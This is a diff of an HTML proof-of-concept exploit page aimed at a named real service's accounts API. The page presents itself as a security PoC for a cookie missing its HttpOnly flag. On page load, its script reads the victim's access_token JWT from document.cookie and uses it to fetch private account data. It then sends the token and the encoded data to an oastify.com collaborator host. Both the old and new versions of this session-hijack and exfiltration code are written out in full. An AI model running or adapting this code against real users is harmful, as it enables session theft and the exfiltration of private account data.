@@ -1,55 +1,63 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Critical PoC - Full Session Hijack</title>
+    <title>Critical Security PoC - Account Hijack</title>
     <style>
         body { font-family: sans-serif; background: #0d1117; color: #c9d1d9; padding: 40px; }
-        .card { background: #161b22; border: 1px solid #30363d; padding: 20px; border-radius: 8px; }
-        .stolen { color: #ff7b72; font-family: monospace; background: #000; padding: 10px; display: block; margin-top: 10px; border-left: 4px solid #ff7b72; }
+        .card { background: #161b22; border: 1px solid #30363d; padding: 30px; border-radius: 10px; max-width: 800px; margin: auto; }
+        .stolen { color: #ff7b72; font-family: monospace; background: #0d1117; padding: 15px; border-radius: 5px; overflow-x: auto; display: block; margin-top: 10px; border: 1px solid #444; }
+        .success-msg { color: #3fb950; font-weight: bold; border: 1px solid #3fb950; padding: 10px; text-align: center; border-radius: 5px; margin-bottom: 20px;}
     </style>
 </head>
 <body>
     <div class="card">
-        <h2>[!] Server-Side Misconfiguration Exploit</h2>
-        <div id="status">Status: Extracting Token...</div>
+        <h2 style="color: #58a6ff;">[!] Practical Account Takeover PoC</h2>
+        <div id="status">Status: Extracting JWT from Storage...</div>
 
-        <p><strong>1. Stolen JWT (Extracted via document.cookie):</strong></p>
-        <code id="jwt-area" class="stolen">Waiting for token...</code>
+        <p><strong>1. Stolen JWT (Extracted via missing HttpOnly flag):</strong></p>
+        <code id="jwt-area" class="stolen">Searching for token...</code>
 
-        <p><strong>2. Private Data (Manual Authorization Bypass):</strong></p>
-        <pre id="data-area" class="stolen">Attempting hijack...</pre>
+        <p><strong>2. Private Data (Fetched using stolen JWT):</strong></p>
+        <pre id="data-area" class="stolen">Waiting for injection...</pre>
     </div>
 
     <script>
-        const TARGET = "https://simplecast-cms-api-gateway.eks.simplecast.com/accounts";
-        const COLLABORATOR = "https://wnndkoxeksvlx9ag1efyecio7fd61xzlo.oastify.com"; // UPDATE THIS
+        const TARGET_API = "https://simplecast-cms-api-gateway.eks.simplecast.com/accounts";
+        const COLLABORATOR = "https://ygifdqqgduonqb3iug807ebq0h68uztni.oastify.com"; // <-- REPLACE WITH YOUR COLLABORATOR URL
 
-        async function startExploit() {
+        async function exploit() {
             try {
-                // STEP 1: Exploit missing HttpOnly
-                // We grab the token from the browser's storage directly
-                const jwt = document.cookie.match(/access_token=([^;]+)/)[1];
-                document.getElementById('jwt-area').innerText = jwt;
+                // STEP 1: Steal the JWT because HttpOnly is missing
+                const cookies = document.cookie;
+                const tokenMatch = cookies.match(/access_token=([^;]+)/);
+                
+                if (tokenMatch) {
+                    const jwt = tokenMatch[1];
+                    document.getElementById('jwt-area').innerText = jwt;
 
-                // STEP 2: Exploit CORS + Manual Hijack
-                // We DON'T use credentials:include (which fails). 
-                // We manually inject the stolen token into the header.
-                const response = await fetch(TARGET, {
-                    method: "GET",
-                    headers: { "Authorization": "Bearer " + jwt }
-                });
+                    // STEP 2: Manually Inject Token into Header
+                    // This bypasses the SameSite=Lax 401 error you saw earlier.
+                    const response = await fetch(TARGET_API, {
+                        method: "GET",
+                        headers: {
+                            "Authorization": "Bearer " + jwt 
+                        }
+                    });
 
-                const json = await response.json();
-                document.getElementById('data-area').innerText = JSON.stringify(json, null, 2);
-                document.getElementById('status').innerText = "EXPLOIT SUCCESSFUL: DATA EXFILTRATED";
+                    const json = await response.json();
+                    document.getElementById('data-area').innerText = JSON.stringify(json, null, 2);
+                    document.getElementById('status').innerHTML = "<div class='success-msg'>SUCCESS: DATA EXFILTRATED TO COLLABORATOR</div>";
 
-                // STEP 3: Send to your server
-                fetch(`${COLLABORATOR}/?stolen_jwt=${jwt}&data=${btoa(JSON.stringify(json))}`);
+                    // STEP 3: Send stolen data to your server
+                    fetch(`${COLLABORATOR}/?stolen_jwt=${jwt}&victim_info=${btoa(JSON.stringify(json))}`);
+                } else {
+                    document.getElementById('status').innerText = "FAILED: access_token not found. Are you logged in to Simplecast?";
+                }
             } catch (err) {
-                document.getElementById('status').innerText = "Note: To see the full hijack in this PoC, the token must be extracted. Since HttpOnly is missing, this is possible via any XSS or Subdomain takeover.";
+                document.getElementById('status').innerText = "Exploit Error: " + err.message;
             }
         }
-        window.onload = startExploit;
+        window.onload = exploit;
     </script>
 </body>
 </html>
